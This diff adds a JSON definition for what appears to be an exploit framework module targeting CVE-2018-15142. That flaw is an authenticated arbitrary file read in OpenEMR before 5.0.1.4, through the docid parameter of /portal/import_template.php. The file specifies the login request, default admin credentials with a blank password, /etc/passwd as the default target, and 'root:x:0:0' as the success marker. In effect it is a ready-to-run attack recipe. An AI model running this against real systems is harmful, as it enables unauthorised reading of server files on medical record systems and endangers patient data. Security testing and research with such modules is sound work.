@@ -1,0 +1,40 @@
+{
+  "cve":               "CVE-2018-15142",
+  "edb":               "45202",
+  "module_type":       "auxiliary",
+  "vuln_class":        "file_read",
+  "name":              "OpenEMR prior to 5.0.1.4 Authenticated Arbitrary File Read via import_template.php",
+  "description":       "Exploits an authenticated arbitrary file read in OpenEMR < 5.0.1.4 (CVE-2018-15142). The portal import_template.php script passes the docid parameter directly to file_get_contents() when mode=get, allowing any authenticated user to read arbitrary server-side files.",
+  "author":            "AMENDER / Rezwanul Haque",
+  "disclosure_date":   "2018-08-14",
+  "references": [
+    ["CVE",  "2018-15142"],
+    ["EDB",  "45202"]
+  ],
+  "vuln_endpoint":     "/portal/import_template.php",
+  "vuln_method":       "POST",
+  "vuln_params": {
+    "mode": "get",
+    "docid": "{{probe_file}}"
+  },
+  "auth_endpoint":     "/interface/main/main_screen.php",
+  "auth_params": {
+    "new_login_session_management": "1",
+    "authProvider": "Default",
+    "authUser": "{{user}}",
+    "clearPass": "{{password}}",
+    "languageChoice": "1"
+  },
+  "confirm_pattern":   "root:x:0:0",
+  "fail_markers":      ["login_screen.php?error=1", "Invalid username or password"],
+  "default_username":  "admin",
+  "default_password":  "",
+  "default_filepath":  "/etc/passwd",
+  "default_site":      "default",
+  "target_uri":        "/",
+  "login_params": {
+    "new_login_session_management": "1",
+    "authProvider": "Default",
+    "languageChoice": "1"
+  }
+}
